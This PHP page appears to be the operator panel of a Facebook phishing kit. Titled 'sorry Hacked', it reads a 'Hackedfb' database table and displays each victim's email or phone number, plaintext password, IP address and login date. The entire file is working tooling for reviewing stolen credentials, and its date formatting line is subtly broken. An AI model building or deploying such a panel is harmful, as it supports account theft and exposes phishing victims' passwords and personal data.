<?php
require '../Config/dbconnect.php';

?>

<!DOCTYPE html>
         <html lang="en">
         <head>
         <title>sorry Hacked </title>
         
         <meta charset="utf-8">
         
         <meta name="viewport" content="width=device-width,initial-scale=1">
         
         <meta http-equiv="X-UA-Compatible" content="ie=edge">
         <!--font awesome-->
         
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
         
         <!--jquery-->
         
         <script src="https://code.Jquery.com/jquery-3.1.1.js"> </script>
         
         <!--spartan-->
         
         <link href="https://fonts.googleapis.com/css2?family=Spartan:wght@300&display=swap" rel="stylesheet">
         
         <!--handlee-->
         
         <link href="https://fonts.googleapis.com/css?family=Handlee" rel="stylesheet">
         
         <!--poppins-->
         <link href="https://fonts.googleapis.com/css?family=Rajdhani" rel="stylesheet ">
         
         <link href="https://fonts.googleapis.com/css?family=Poppins" rel="stylesheet">
         
         
         <link href="https://fonts.googleapis.com/css?family=Lato&display=swap" rel="stylesheet">
         
         
         <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
         <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
         
         
         <!--Google fonts-->
         <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
         
         
         <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&family=Poppins:wght@100;200;300;400;500;600;700;800;900&family=Roboto:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
         
         
 
 <style type="text/css">
table {
    border-collapse: collapse;
    width: 100%;
}

th, td {
    text-align: left;
    padding:1px;
}

tr:nth-child(even){background-color: #f2f2f2}

th {
    background-color:#005088;
    color: white;
}
</style>

</head>


<body>

<h4>Sorry guys, 😭</h4>

<?php
$query="SELECT * FROM Hackedfb";
   
    $body=$conn->query($query);
       if($body->num_rows > 0):
      ?>

       
 <table>
       <tr>
       <th>Email/Phone No</th>
       <th>Password</th>
       <th>Ip-address</th>
       <th>logdate</th>
       </tr>
       
       <?php  while($list=$body->fetch_assoc()):  ?>
       
    <tr>
     
    <td> <?php echo $list["email"]; ?> </td>
    <td> <?php echo $list["password"]; ?> </td>
    <td> <?php echo $list["ip"]; ?>  </td>
    <td> <?php echo date(strtotime($list["date"])); ?> </td>
    </tr>
    
   
   <?php endwhile ?> 
 </table>
  
     <?php else: ?>
     
     <p> No record at the moment</p>
     <?php endif ?>
</body>
</html>
